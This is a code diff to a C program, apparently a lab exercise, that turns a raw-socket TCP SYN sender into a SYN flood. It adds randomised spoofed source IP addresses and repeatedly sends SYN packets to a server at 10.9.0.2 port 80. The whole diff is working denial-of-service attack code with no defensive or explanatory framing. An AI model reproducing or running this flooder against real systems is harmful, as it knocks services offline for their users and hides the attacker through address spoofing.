@@ -11,6 +11,7 @@
 #include <netinet/tcp.h>
 
 #define SOURCE_PORT 12345
+#define MASK 256
 #define SERVER_IP "10.9.0.2"
 #define SERVER_PORT 80
 #define BUFFER_SIZE 1024
@@ -45,30 +46,31 @@ unsigned short checksum(void *b, int len)
 int main()
 {
     int sock;
-    
-    char hostbuffer[256];
-    struct hostent *host_entry;
-    int hostname;
-    struct in_addr **addr_list;
+    int mask1, mask2, mask3, mask4;
 
-    // retrieve hostname
-    hostname = gethostname(hostbuffer, sizeof(hostbuffer));
-    if (hostname == -1)
-    {
-        perror("gethostname error");
-        exit(1);
-    }
-    // Retrieve IP addresses
-    host_entry = gethostbyname(hostbuffer);
-    if (host_entry == NULL)
-    {
-        perror("gethostbyname error");
-        exit(1);
-    }
-    addr_list = (struct in_addr **)host_entry->h_addr_list;
-    printf("IP address: %s\n", inet_ntoa(*addr_list[0]));
+    // char hostbuffer[256];
+    // struct hostent *host_entry;
+    // int hostname;
+    // struct in_addr **addr_list;
 
-    char *src_ip = inet_ntoa(*addr_list[0]);
+    // // retrieve hostname
+    // hostname = gethostname(hostbuffer, sizeof(hostbuffer));
+    // if (hostname == -1)
+    // {
+    //     perror("gethostname error");
+    //     exit(1);
+    // }
+    // // Retrieve IP addresses
+    // host_entry = gethostbyname(hostbuffer);
+    // if (host_entry == NULL)
+    // {
+    //     perror("gethostbyname error");
+    //     exit(1);
+    // }
+    // addr_list = (struct in_addr **)host_entry->h_addr_list;
+    // printf("IP address: %s\n", inet_ntoa(*addr_list[0]));
+
+    // char *src_ip = inet_ntoa(*addr_list[0]);
 
     // Create a socket
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -96,74 +98,79 @@ int main()
     struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
     struct pseudo_header psh;
 
-    // Fill in the IP Header
-    iph->ihl = 5;
-    iph->version = 4;
-    iph->tos = 0;
-    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    iph->id = htonl(54321); // Id of this packet
-    iph->frag_off = 0;
-    iph->ttl = 255;
-    iph->protocol = IPPROTO_TCP;
-    iph->check = 0;                    // Set to 0 before calculating checksum
-    iph->saddr = inet_addr(src_ip);    // Source IP
-    iph->daddr = inet_addr(SERVER_IP); // Destination IP
-
-    iph->check = checksum((unsigned short *)packet, iph->tot_len);
-
-    // TCP Header
-    tcph->source = htons(SOURCE_PORT);
-    tcph->dest = htons(SERVER_PORT);
-    tcph->seq = 0;
-    tcph->ack_seq = 0;
-    tcph->doff = 5; // tcp header size
-    tcph->fin = 0;
-    tcph->syn = 1;
-    tcph->rst = 0;
-    tcph->psh = 0;
-    tcph->ack = 0;
-    tcph->urg = 0;
-    tcph->window = htons(5840); /* maximum allowed window size */
-    tcph->check = 0;            // leave checksum 0 now, filled later by pseudo header
-    tcph->urg_ptr = 0;
-
-    // Now the TCP checksum
-    psh.source_address = inet_addr(src_ip);
-    psh.dest_address = inet_addr(SERVER_IP);
-    psh.placeholder = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_length = htons(sizeof(struct tcphdr));
-
-    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
-    char *pseudogram = (char *)malloc(psize);
-
-    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
-    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
-
-    tcph->check = checksum((unsigned short *)pseudogram, psize);
-
-    // Send the packet
-    struct sockaddr_in dest;
-    dest.sin_family = AF_INET;
-    dest.sin_port = htons(SERVER_PORT);
-    dest.sin_addr.s_addr = inet_addr(SERVER_IP);
+    printf("Sending SYN flood to %s:%d\n", SERVER_IP, SERVER_PORT);
 
     for (size_t j = 0; j < NUM_OF_ITERATIONS; j++)
     {
         for (size_t i = 0; i < NUM_OF_TRIES; i++)
         {
+            mask1 = rand() % MASK;
+            mask2 = rand() % MASK;
+            mask3 = rand() % MASK;
+            mask4 = rand() % MASK;
+            char src_ip[16];
+            snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", mask1, mask2, mask3, mask4);
+            printf("Sending packet from %s\n", src_ip);
+            // Fill in the IP Header
+            iph->ihl = 5;
+            iph->version = 4;
+            iph->tos = 0;
+            iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+            iph->id = htonl(54321); // Id of this packet
+            iph->frag_off = 0;
+            iph->ttl = 255;
+            iph->protocol = IPPROTO_TCP;
+            iph->check = 0;                    // Set to 0 before calculating checksum
+            iph->saddr = inet_addr(src_ip);    // Source IP
+            iph->daddr = inet_addr(SERVER_IP); // Destination IP
+
+            iph->check = checksum((unsigned short *)packet, iph->tot_len);
+
+            // TCP Header
+            tcph->source = htons(SOURCE_PORT);
+            tcph->dest = htons(SERVER_PORT);
+            tcph->seq = 0;
+            tcph->ack_seq = 0;
+            tcph->doff = 5; // tcp header size
+            tcph->fin = 0;
+            tcph->syn = 1;
+            tcph->rst = 0;
+            tcph->psh = 0;
+            tcph->ack = 0;
+            tcph->urg = 0;
+            tcph->window = htons(5840); /* maximum allowed window size */
+            tcph->check = 0;            // leave checksum 0 now, filled later by pseudo header
+            tcph->urg_ptr = 0;
+
+            // Now the TCP checksum
+            psh.source_address = inet_addr(src_ip);
+            psh.dest_address = inet_addr(SERVER_IP);
+            psh.placeholder = 0;
+            psh.protocol = IPPROTO_TCP;
+            psh.tcp_length = htons(sizeof(struct tcphdr));
+
+            int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
+            char *pseudogram = (char *)malloc(psize);
+
+            memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
+            memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
+
+            tcph->check = checksum((unsigned short *)pseudogram, psize);
+
+            // Send the packet
+            struct sockaddr_in dest;
+            dest.sin_family = AF_INET;
+            dest.sin_port = htons(SERVER_PORT);
+            dest.sin_addr.s_addr = inet_addr(SERVER_IP);
+
             if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
             {
                 perror("Send failed");
             }
-            else
-            {
-                printf("Packet sent. Length : %d bytes\n", iph->tot_len);
-            }
+            free(pseudogram);
         }
     }
-    
-    free(pseudogram);
+
     close(sock);
     printf("\nConnection closed.\n");
 
